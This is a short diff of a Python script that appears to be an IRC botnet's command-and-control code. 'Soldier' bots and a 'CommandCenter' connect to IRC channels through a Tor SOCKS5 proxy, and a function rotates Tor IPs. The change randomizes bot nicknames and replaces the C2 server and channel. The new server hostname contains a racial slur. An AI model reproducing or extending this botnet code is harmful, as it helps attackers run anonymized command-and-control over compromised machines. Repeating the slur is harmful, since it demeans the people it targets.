@@ -108,7 +108,7 @@ def receiveCommandCenter(s,channel):
 					pass
 				
 def Soldier(host, q):
-	nick = ''.join(random.choice(string.ascii_letters) for x in range(3)) + str(random.randint(0, 10000))
+	nick = ''.join(random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for x in range(11)) #+ str(random.randint(0, 10000))
 	port = 6667
 	channel = "#cake"
 	#Connect to irc server
@@ -129,9 +129,9 @@ def NewTorIP():
 
 def CommandCenter():
 	nick = "CommandCenter"
-	server = "irc.menthol.pw"
+	server = "irc.niggerbread.me"
 	port = 6667
-	channel = "#command"
+	channel = "#iffi"
 	#Connect to irc server
 	s = socks.socksocket()
 	s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
